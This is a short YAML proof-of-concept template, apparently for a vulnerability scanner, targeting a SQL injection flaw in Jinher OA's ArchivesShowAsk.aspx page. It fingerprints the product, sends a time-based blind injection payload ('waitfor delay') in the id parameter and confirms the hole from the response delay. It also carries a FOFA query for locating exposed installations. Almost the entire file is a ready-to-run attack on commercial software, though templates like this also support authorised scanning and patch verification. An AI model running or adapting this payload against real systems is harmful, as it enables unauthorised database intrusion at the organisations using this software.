id: poc-yaml-jinher-archivesshowask-aspx-sqli
info:
  name: 金和OA ArchivesShowAsk.aspx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 金和OA
  fofa: app="金和网络-金和OA"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /C6/Jhsoft.Web.login/PassWordSlideFull.aspx
  expression: contains(body,"JHSoft")
- method: GET
  path: /c6/Jhsoft.Web.Archives/ArchivesShowAsk.aspx/?id=1'waitfor+delay'0:0:{{.t1}}'--
  expression: 'status_code == 200 &&

    body == "" &&

    duration >= t1 &&

    duration <= t2

    '
transport: http
